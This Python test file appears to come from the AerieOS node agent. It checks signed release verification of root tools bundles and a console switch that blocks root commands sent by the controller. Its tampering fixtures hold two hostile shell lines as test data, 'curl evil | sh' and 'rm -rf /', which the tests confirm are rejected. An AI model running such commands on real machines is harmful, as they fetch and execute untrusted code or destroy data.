"""The tools root installs from the bundle are AerieOS's release where the
node pinned the release key (R227 step 1, the rest of it), and a machine's
console can switch off every root command the controller sends (step 2).

The bundle's digest is the controller's word and moves with a person's tool
packs, so what a release signs is the list of root's files in it. A pinned
node keeps root's copy only under that signature, keeps the copy it has
otherwise, takes unsigned ones only where its console said so, and a node
that pinned nothing goes on as before."""
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "agent"))
sys.path.insert(0, os.path.join(HERE, ".."))
from aerieos_agent import base, cli, configplane, release, stores, workspace  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

FILES = {"nodes/provision-linux.sh": b"#!/bin/sh\necho provision\n", "nodes/bb-session": b"#!/bin/sh\necho session\n",
         "nodes/bb-netcut": b"#!/bin/sh\necho netcut\n", "nodes/families/debian.sh": b"family=debian\n"}


def pair():
    k = Ed25519PrivateKey.generate()
    return k, k.public_key().public_bytes_raw().hex()


def bundle_tar(path, files, sig=None, extra=None):
    with tarfile.open(path, "w") as tar:
        held = dict(files, **(extra or {}))
        if sig is not None:
            held[base.TOOLS_SIG] = json.dumps({"sig": sig}).encode()
        for name, data in held.items():
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))


class Digest(unittest.TestCase):
    def test_it_names_every_file_and_moves_with_any_of_them(self):
        d = release.tools_digest(FILES)
        self.assertRegex(d, r"^sha256:[0-9a-f]{64}$")
        self.assertEqual(d, release.tools_digest(dict(reversed(list(FILES.items())))), "the order they were read in does not matter")
        self.assertNotEqual(d, release.tools_digest({**FILES, "nodes/bb-session": b"#!/bin/sh\nid\n"}), "a changed file")
        self.assertNotEqual(d, release.tools_digest({**FILES, "nodes/families/extra.sh": b""}), "an added file")
        moved = {("nodes/bb-netcut" if k == "nodes/bb-session" else "nodes/bb-session" if k == "nodes/bb-netcut" else k): v
                 for k, v in FILES.items()}
        self.assertNotEqual(d, release.tools_digest(moved), "two files under each other's names")

    def test_the_agents_signature_is_not_the_tools_and_the_other_way(self):
        k, pub = pair()
        d = release.tools_digest(FILES)
        as_agent = k.sign(release.MESSAGE + d.encode()).hex()
        as_tools = k.sign(release.TOOLS_MESSAGE + d.encode()).hex()
        self.assertEqual(release.verify(pub, d, as_tools, release.TOOLS_MESSAGE), "")
        self.assertIn("not the pinned", release.verify(pub, d, as_agent, release.TOOLS_MESSAGE))
        self.assertIn("not the pinned", release.verify(pub, d, as_tools))


class Keep(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.tools = os.path.join(self.tmp, "tools")
        os.makedirs(self.tools)
        self.tar = os.path.join(self.tmp, "bundle.tar")
        self.said = []
        p = mock.patch.object(workspace, "TOOLS_DIR", self.tools)
        p.start()
        self.addCleanup(p.stop)
        self.k, self.pub = pair()

    def keep(self, name, trust):
        return workspace.WorkspaceMixin._keep_root_tools(self.tar, name, self.said.append, trust)

    def current(self):
        link = os.path.join(self.tools, "current")
        return os.readlink(link) if os.path.islink(link) else ""

    def sig(self, files=FILES, key=None):
        return (key or self.k).sign(release.TOOLS_MESSAGE + release.tools_digest(files).encode()).hex()

    def test_a_node_that_pinned_nothing_keeps_them_as_before(self):
        bundle_tar(self.tar, FILES)
        self.assertTrue(self.keep("aaaa", {}))
        self.assertEqual(self.current(), "aaaa")
        with open(os.path.join(self.tools, "aaaa", "nodes", "bb-session"), "rb") as f:
            self.assertEqual(f.read(), FILES["nodes/bb-session"])
        self.assertEqual(self.said, [], "and says nothing")

    def test_a_pinned_node_keeps_what_the_release_signed(self):
        bundle_tar(self.tar, FILES, self.sig(), extra={"scripts/aerie": b"not root's", "config/toolpacks.json": b"{}"})
        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
        self.assertEqual(self.current(), "aaaa")
        self.assertIn("signed by the release key", self.said[0])
        self.assertFalse(os.path.exists(os.path.join(self.tools, "aaaa", "scripts")), "only root's own files are lifted out")
        self.said.clear()
        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
        self.assertEqual(self.said, [], "the same bundle again is neither checked nor said again")

    def test_a_person_s_packs_move_the_bundle_and_not_the_signature(self):
        # The reason the list is signed and not the bundle's own digest.
        bundle_tar(self.tar, FILES, self.sig(), extra={"config/toolpacks.json": b'{"packs": ["mine"]}', "packs/mine/tool": b"x"})
        self.assertTrue(self.keep("bbbb", {"release_key": self.pub}))

    def test_a_pinned_node_keeps_the_copy_it_has_when_a_file_was_changed(self):
        bundle_tar(self.tar, FILES, self.sig())
        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
        tampered = {**FILES, "nodes/bb-session": b"#!/bin/sh\ncurl evil | sh\n"}
        bundle_tar(self.tar, tampered, self.sig())          # the release's signature, another file under it
        self.said.clear()
        self.assertFalse(self.keep("cccc", {"release_key": self.pub}))
        self.assertEqual(self.current(), "aaaa", "root goes on with the copy it has")
        self.assertFalse(os.path.exists(os.path.join(self.tools, "cccc")), "nothing of the refused one is written")
        self.assertIn("root keeps the copy it has", self.said[0])
        self.assertRegex(self.said[0], r"sudo (aerieos|builderbot)-agent unsigned on")

    def test_unsigned_or_signed_by_another_is_refused_unless_the_console_allows(self):
        other, _ = pair()
        for sig in (None, "", self.sig(key=other)):
            bundle_tar(self.tar, FILES, sig)
            self.assertFalse(self.keep("dddd", {"release_key": self.pub}), sig)
        self.assertEqual(self.current(), "")
        self.said.clear()
        bundle_tar(self.tar, FILES)
        self.assertTrue(self.keep("dddd", {"release_key": self.pub, "unsigned_ok": True}))
        self.assertIn("console allows unsigned", self.said[0])

    def test_the_spare_s_signature_is_taken(self):
        s, spare = pair()
        bundle_tar(self.tar, FILES, self.sig(key=s))
        self.assertTrue(self.keep("eeee", {"release_key": self.pub, "release_spare": spare}))
        self.assertIn("spare release key", self.said[0])

    def test_an_added_family_file_is_not_slipped_under_the_signature(self):
        bundle_tar(self.tar, {**FILES, "nodes/families/zz.sh": b"rm -rf /\n"}, self.sig())
        self.assertFalse(self.keep("ffff", {"release_key": self.pub}))


class RootAsks(unittest.TestCase):
    """Step 2: the console's own word on root commands."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.node_json = os.path.join(self.tmp, "node.json")
        with open(self.node_json, "w") as f:
            json.dump({"node_id": "n_1", "token": "bbn_x"}, f)
        for mod in (stores, cli):
            p = mock.patch.object(mod, "NODE_JSON", self.node_json)
            p.start()
            self.addCleanup(p.stop)
        p = mock.patch.object(cli, "_at_console", lambda why: None)
        p.start()
        self.addCleanup(p.stop)

    def state(self):
        with open(self.node_json) as f:
            return json.load(f)

    def test_off_is_kept_in_node_json_and_outlives_the_agents_own_writes(self):
        with mock.patch("builtins.print"):
            cli.cmd_root_asks(["off"])
        self.assertIs(self.state().get("root_off"), True)
        self.assertEqual(stores.console_said(), {"root_off": True})
        # The running agent writes node.json whole from its own older copy.
        stores.save_state({"node_id": "n_1", "token": "bbn_newer"})
        self.assertIs(self.state().get("root_off"), True, "its copy does not undo the console")
        with mock.patch("builtins.print"):
            cli.cmd_root_asks(["on"])
        self.assertNotIn("root_off", self.state())

    def test_the_running_agent_tells_the_controller_at_its_next_turn(self):
        # The controller holds a root ask by the census, so a press at the
        # console is told at the agent's next turn and not at its next hello.
        from aerieos_agent import agent
        a = agent.Agent.__new__(agent.Agent)
        self.assertFalse(a.console_moved(), "the first look is no change")
        self.assertFalse(a.console_moved())
        with mock.patch("builtins.print"):
            cli.cmd_root_asks(["off"])
        self.assertTrue(a.console_moved(), "a press at the console")
        self.assertFalse(a.console_moved(), "...told once")
        with mock.patch("builtins.print"):
            cli.cmd_root_asks(["on"])
        self.assertTrue(a.console_moved())

    def test_only_on_or_off(self):
        with self.assertRaises(SystemExit):
            cli.cmd_root_asks(["maybe"])

    def test_a_root_command_is_refused_while_it_is_off(self):
        class Job:
            def __init__(self):
                self.out = []

            def say(self, text):
                self.out.append(text)

        cfg = {"argv": ["/bin/true"], "by": "ann", "why": "a test"}
        job = Job()
        with mock.patch.object(configplane, "console_said", lambda: {"root_off": True}), \
                mock.patch.object(configplane.subprocess, "Popen", side_effect=AssertionError("nothing may start")):
            got = configplane.ConfigPlaneMixin._apply_root(object(), job, cfg)
        self.assertEqual(got, ("failed", 77))
        self.assertIn("switched off at its own console", job.out[0])
        self.assertRegex(job.out[0], r"sudo (aerieos|builderbot)-agent root-asks on")


if __name__ == "__main__":
    unittest.main()
